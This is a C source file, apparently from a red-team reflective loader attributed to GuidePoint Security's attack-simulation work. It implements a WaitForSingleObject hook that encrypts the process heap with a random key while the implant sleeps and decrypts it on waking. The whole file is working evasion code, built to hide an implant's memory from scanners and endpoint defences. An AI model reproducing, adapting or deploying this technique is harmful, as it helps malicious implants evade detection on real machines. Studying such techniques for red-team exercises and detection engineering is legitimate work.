/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

#if defined( _WIN64 )

/*!
 *
 * Purpose:
 *
 * Blocks until the wait completes.
 *
!*/
D_SEC( D ) DWORD WINAPI WaitForSingleObject_Hook( _In_ HANDLE Handle, _In_ DWORD dwMilliseconds )
{
	NTSTATUS	Nst = STATUS_UNSUCCESSFUL;
	UINT8		Key[ 0x10 ];
	LARGE_INTEGER	Del;

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
	RtlSecureZeroMemory( &Del, sizeof( Del ) );

	/* Generate a random key */
	RandomString( &Key, sizeof( Key ) );

	/* Encrypt the heap */
	HeapEncryptDecrypt( &Key, sizeof( Key ) );

	/* Set the time to delay for. */
	Del.QuadPart = -10000LL * dwMilliseconds;

	/* Wait on the handle for the delay period */
	Nst = ObfNtWaitForSingleObject( Handle, FALSE, &Del );

	if ( ! NT_SUCCESS( Nst ) ) {
		NtCurrentTeb()->LastErrorValue = Nst;
		Nst = WAIT_FAILED;
	};

	/* Decrypt the heap */
	HeapEncryptDecrypt( &Key, sizeof( Key ) );

	/* Zero out stack structures */
	RtlSecureZeroMemory( &Key, sizeof( Key ) );
	RtlSecureZeroMemory( &Del, sizeof( Del ) );

	/* Notify of error */
	return Nst;
};

#endif
